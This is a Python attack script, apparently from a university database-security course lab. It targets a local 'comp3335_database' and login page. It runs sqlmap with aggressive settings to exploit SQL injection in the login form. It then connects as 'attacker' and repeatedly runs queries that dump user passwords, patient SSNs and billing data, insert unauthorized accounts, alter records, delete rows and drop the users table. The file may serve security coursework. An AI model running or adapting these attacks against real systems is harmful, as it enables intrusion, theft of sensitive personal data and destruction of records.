import pymysql
import subprocess

# Database connection details
HOST = "localhost"  # The name of your MySQL service in docker-compose
USER = "attacker"
PASSWORD = ""
DATABASE = "comp3335_database"
PORT = 3306  # MySQL default port

# List of malicious queries to execute
MALICIOUS_QUERIES = [
    "SELECT * FROM comp3335_database.users;",
    "SELECT comp3335_database.patientSSN FROM comp3335_database.patients;",
    "SELECT comp3335_database.password FROM comp3335_database.users;",
    "SELECT * FROM comp3335_database.orders;",
    "SELECT * FROM comp3335_database.billings;",
    "INSERT INTO comp3335_database.users (email, password) VALUES ('unauthorized@example.com', 'password123');",
    "INSERT INTO comp3335_database.patients (patientSSN, firstName, lastName) VALUES ('123-45-6789', 'John', 'Doe');",
    "UPDATE comp3335_database.users SET password = 'newpassword' WHERE email = 'unauthorized@example.com';",
    "UPDATE comp3335_database.patients SET patientSSN = '987-65-4321' WHERE firstName = 'John';",
    "DELETE FROM comp3335_database.billings WHERE orderID = 1;",
    "DROP TABLE IF EXISTS comp3335_database.users;"
]

def execute_query(query, cursor, connection):
    try:
        cursor.execute(query)
        if query.strip().upper().startswith("SELECT"):
            # Fetch and print the results for SELECT queries
            results = cursor.fetchall()
            for row in results:
                print(row)
        else:
            # Commit changes for INSERT, UPDATE, DELETE queries
            connection.commit()
            print(f"Executed successfully: {query}")
    except pymysql.MySQLError as e:
        print(f"Error executing query: {query}\nError: {e}")
       
 
def run_sqlmap():
    # Define the SQLMap command
    command = [
        "sqlmap", 
        "-u", "http://localhost/login.php",
        "--data", "csrf_token=%3C%3Fphp+echo+htmlspecialchars%28%24_SESSION%5B%27csrf_token%27%5D+%3F%3F+%27%27%29%3B+%3F%3E&email=alice%40gmail.com&password=123456",
        "-p", "email,password",
        "--batch", 
        "--level=5", 
        "--risk=3",
        "--timeout=10"
    ]

    try:
        # Run the command and capture the output
        result = subprocess.run(command, text=True, capture_output=True)

        # Print SQLMap output
        print("SQLMap Output:")
        print(result.stdout)

        # Print any errors
        if result.stderr:
            print("Errors:")
            print(result.stderr)

    except FileNotFoundError:
        print("Error: sqlmap is not installed or not found in your PATH.")
    except Exception as e:
        print(f"An error occurred: {e}")


def main():
    
    # Run SQLMap to exploit the SQL injection vulnerability
    run_sqlmap()
    
    print("SQL Injection attack completed.")
    
    try:
        # Connect to the database
        connection = pymysql.connect(
            host=HOST,
            user=USER,
            password=PASSWORD,
            database=DATABASE,
            port=PORT
        )

        if connection.open:
            print("Connected to the database as attacker.")
            cursor = connection.cursor()

            # Execute each malicious query
            for i in range(10000):
                for query in MALICIOUS_QUERIES:
                    print(f"Executing: {query}")
                    execute_query(query, cursor, connection)

    except pymysql.MySQLError as e:
        print(f"Error connecting to database: {e}")

    finally:
        if 'connection' in locals() and connection.open:
            cursor.close()
            connection.close()
            print("Database connection closed.")

if __name__ == "__main__":
    main()